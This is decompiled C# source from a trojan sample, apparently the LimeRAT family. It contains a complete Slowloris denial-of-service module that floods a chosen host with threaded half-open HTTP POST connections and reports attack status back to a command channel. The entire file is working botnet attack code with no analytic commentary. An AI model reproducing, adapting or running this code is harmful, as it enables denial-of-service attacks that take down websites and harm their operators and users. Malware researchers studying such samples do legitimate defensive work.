// Decompiled with JetBrains decompiler
// Type: Slowloris
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

[StandardModule]
public sealed class Slowloris
{
  private static object ThreadsEnded = (object) 0;
  private static string PostDATA;
  private static string HostToAttack;
  private static int TimetoAttack;
  private static int ThreadstoUse;
  private static Thread[] Threads;
  private static bool AttackRunning = false;
  private static int attacks = 0;

  public static void StartSlowloris(string Host, int Threadsto, int Time, string data)
  {
    if (!Slowloris.AttackRunning)
    {
      Slowloris.AttackRunning = true;
      Slowloris.HostToAttack = Host;
      Slowloris.PostDATA = data;
      Slowloris.ThreadstoUse = Threadsto;
      Slowloris.TimetoAttack = Time;
      if (Slowloris.HostToAttack.Contains("http://"))
        Slowloris.HostToAttack = Slowloris.HostToAttack.Replace("http://", string.Empty);
      if (Slowloris.HostToAttack.Contains("www."))
        Slowloris.HostToAttack = Slowloris.HostToAttack.Replace("www.", string.Empty);
      if (Slowloris.HostToAttack.Contains("/"))
        Slowloris.HostToAttack = Slowloris.HostToAttack.Replace("/", string.Empty);
      Slowloris.Threads = new Thread[checked (Threadsto - 1 + 1)];
      Core.Send("MSG" + Core.Y + "Slowloris Attack on " + Slowloris.HostToAttack + " started!");
      int num = checked (Threadsto - 1);
      int index = 0;
      while (index <= num)
      {
        Slowloris.Threads[index] = new Thread(new ThreadStart(Slowloris.DoWork));
        Slowloris.Threads[index].IsBackground = true;
        Slowloris.Threads[index].Start();
        checked { ++index; }
      }
    }
    else
      Core.Send("MSG" + Core.Y + "Slowloris Attack is Already Running on " + Slowloris.HostToAttack ?? "");
  }

  private static void lol()
  {
    Slowloris.ThreadsEnded = Operators.AddObject(Slowloris.ThreadsEnded, (object) 1);
    if (!Operators.ConditionalCompareObjectEqual(Slowloris.ThreadsEnded, (object) Slowloris.ThreadstoUse, false))
      return;
    Slowloris.ThreadsEnded = (object) 0;
    Slowloris.ThreadstoUse = 0;
    Slowloris.AttackRunning = false;
    Core.Send("MSG" + Core.Y + "Slowloris Attack on " + Slowloris.HostToAttack + " finished successfully");
    Slowloris.attacks = 0;
  }

  public static void StopSlowloris()
  {
    if (Slowloris.AttackRunning)
    {
      int num = checked (Slowloris.ThreadstoUse - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          Slowloris.Threads[index].Abort();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      Slowloris.AttackRunning = false;
      Core.Send("MSG" + Core.Y + "Slowloris Attack on " + Slowloris.HostToAttack + " stopped successfully");
      Slowloris.attacks = 0;
    }
    else
      Core.Send("MSG" + Core.Y + "No Slowloris Attack is running!");
  }

  private static void DoWork()
  {
    try
    {
      Socket[] socketArray = new Socket[100];
      TimeSpan timeSpan = TimeSpan.FromSeconds((double) Slowloris.TimetoAttack);
      Stopwatch stopwatch = Stopwatch.StartNew();
      while (stopwatch.Elapsed < timeSpan)
      {
        try
        {
          WebClient webClient = new WebClient();
          int index1 = 0;
          do
          {
            socketArray[index1] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socketArray[index1].Connect(Dns.GetHostAddresses(Slowloris.HostToAttack), 80);
            socketArray[index1].Send(Encoding.Default.GetBytes("POST / HTTP/1.1\r\nHost: " + Slowloris.HostToAttack.ToString() + "\r\nContent-length: 5235\r\n\r\n"), SocketFlags.None);
            checked { ++Slowloris.attacks; }
            checked { ++index1; }
          }
          while (index1 <= 99);
          int index2 = 0;
          do
          {
            socketArray[index2].Close();
            checked { ++index2; }
          }
          while (index2 <= 99);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Slowloris.lol();
  }
}
